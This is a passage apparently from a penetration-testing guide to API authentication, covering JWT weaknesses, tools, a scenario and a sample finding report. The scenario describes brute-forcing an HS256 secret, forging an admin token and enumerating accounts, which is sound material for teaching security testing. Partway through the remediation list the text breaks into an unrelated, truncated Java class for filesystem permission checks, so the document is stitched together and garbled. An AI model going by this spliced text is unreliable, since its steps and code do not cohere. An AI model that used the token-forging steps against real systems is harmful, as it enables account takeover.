weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. com.example.auth;\n\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.LinkOption;\nimport java.nio.file.Path;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.util.Set;\n\n/**\n * Fail-closed checks on filesystem objects that hold the credential store or its audit trail.\n *\n * <p>All checks are on the mode bits and ownership, never on whether a read succeeds: the reference\n * platform runs as root, and root bypasses permission bits, so an accessibility probe would report\n * a world-readable file as safe.\n */\nfinal class DbPathGuard {\n\n    private DbPathGuard() {\n    }\n\n    /**\n     * The directory must exist, be a real directory (not a symlink), be owned by the running\n     * account, and carry no group or world bits. A world-writable directory lets any local account\n     * replace or swap the credential file regardless of its own mode.\n     */\n    static void requirePrivateDirectory(Path dir) throws IOException {\n        if (Files.isSymbolicLink(dir)) {\n            throw new IOException(\"dir_is_symlink\");\n        }\n        if (!Files.isDirectory(dir, LinkOption.NOFOLLOW_LINKS)) {\n            throw new IOException(\"not_a_directory\");\n        }\n        Set<PosixFilePermission> mode = Files.getPosixFilePermissions(dir, LinkOption.NOFOLLOW_LINKS);\n        requireNoForeignAccess(mode);\n        requireOwnedByCurrentUser(dir);\n        if (!mode.contains(PosixFilePermission.OWNER_WRITE)\n                || !mode.contains(PosixFilePermission.OWNER_EXECUTE)) {\n            throw new IOException(\"dir_not_writable_by_owner\");\n        }\n    }\n\n    /** The file must be a regular file (not a symlink), owned by us, and mode 0600 or stricter. */\n    static void requirePrivateRegularFile(Path file) throws IOException {\n        if (Files.isSymbolicLink(file)) {\n            throw new IOException(\"file_is_symlink\");\n        }\n        if (!Files.isRegularFile(file, LinkOption.NOFOLLOW_LINKS)) {\n            throw new IOException(\"not_a_regular_file\");\n        }\n        Set<PosixFilePermission> mode = Files.getPosixFilePermissions(file, LinkOption.NOFOLLOW_LINKS);\n        requireNoForeignAccess(mode);\n        requireOwnedByCurrentUser(file);\n    }\n\n    private static void requireNoForeignAccess(Set<PosixFilePermission> mode) throws IOException {\n        for (PosixFilePermission p : mode) {\n            String name = p.name();\n            if (name.startsWith(\"GROUP_\") || name.startsWith(\"OTHERS_\")) {\n                throw new IOException(\"path_grants_access_to_others\");\n            }\n        }\n    }\n\n    private static void requireOwnedByCurrentUser(Path p) throws IOException {\n        java.nio.file.attribute.FileOwnerAttributeView view = Files.getFileAttributeView(p,\n
